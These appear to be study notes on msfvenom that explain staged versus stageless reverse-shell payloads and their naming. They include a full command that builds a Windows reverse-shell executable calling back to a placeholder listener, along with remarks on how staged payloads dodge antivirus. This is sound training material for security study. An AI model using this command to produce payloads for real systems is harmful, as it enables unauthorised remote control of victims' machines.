Msfvenom: the one-stop-shop for all things payload related.
part of the metasploit framework 

Aside from the `msfconsole` man page, the other important thing to note when working with msfvenom is:  

`msfvenom --list payloads`


``windows/shell_reverse_tcp``
In the above examples the payload used was `shell_reverse_tcp`. This indicates that it was a _stageless_ payload. How? Stageless payloads are denoted with underscores (`_`). The staged equivalent to this payload would be:

eg;

```

msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>


#options
-f <output format>
-o <output location>
LHOST=<IP>
LPORT=<poort> 

- The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

```

_Staged vs Stageless_  

Before we go any further, there are another two concepts which must be introduced: _**staged**_ reverse shell payloads and _**stageless**_ reverse shell payloads.

- _**Staged**_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.  
    
- _**Stageless**_ payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.


_Payload Naming Conventions_

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

`<OS>/<arch>/<payload>`